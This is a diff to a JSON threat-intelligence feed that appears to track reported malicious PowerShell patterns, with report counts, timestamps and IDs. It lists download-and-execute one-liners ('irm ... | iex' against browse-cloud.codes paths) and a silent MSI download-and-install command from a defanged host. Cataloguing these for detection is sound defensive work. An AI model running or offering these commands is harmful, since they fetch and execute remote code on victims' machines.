@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 120,
-    "ReportCount": 120,
+    "DistinctPayloadCount": 121,
+    "ReportCount": 121,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-14T14:44:10.592000+00:00",
+    "LastSeen": "2026-11-14T16:37:51.895000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -125,7 +125,8 @@
       "cmwf4esed0fpg0omlmg0cwhh2",
       "cmwfarrwk0fv70oml64i0nnlm",
       "cmwfq2sdt0iq70omlfqlpffxx",
-      "cmwginvma0lic0omlk1c2ku1a"
+      "cmwginvma0lic0omlk1c2ku1a",
+      "cmwgmq2yd0lr20omlqz1zffk5"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -149,6 +150,7 @@
       "irm 'browse-cloud.codes/8751569bda6b597f'|iex;",
       "irm 'browse-cloud.codes/875877f7d9ba3a9c'|iex;",
       "irm 'browse-cloud.codes/a067777a17e09629'|iex;",
+      "irm 'browse-cloud.codes/a3a0979350a6065b'|iex;",
       "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
       "irm 'browse-cloud.codes/aa57ea23162442f3'|iex;",
       "irm 'browse-cloud.codes/b588d19d7447a34f'|iex;",
@@ -793,9 +795,9 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 25,
+    "ReportCount": 26,
     "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
-    "LastSeen": "2026-11-14T01:20:56.286000+00:00",
+    "LastSeen": "2026-11-14T16:37:57.382000+00:00",
     "ReportIds": [
       "cmw90o6il2gli0omlwlr2xrzm",
       "cmwclwpgw0a210omltnipi6za",
@@ -821,7 +823,8 @@
       "cmwf2w2a00fkl0oml1ac8kcxp",
       "cmwf9tn7k0fqr0omliwntu216",
       "cmwfcanbl0gd80omlgekvfmd3",
-      "cmwfpywm20ikw0omloshmzs1c"
+      "cmwfpywm20ikw0omloshmzs1c",
+      "cmwgmq76i0lru0omlkr8mx6sp"
     ],
     "PayloadExamples": [
       "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
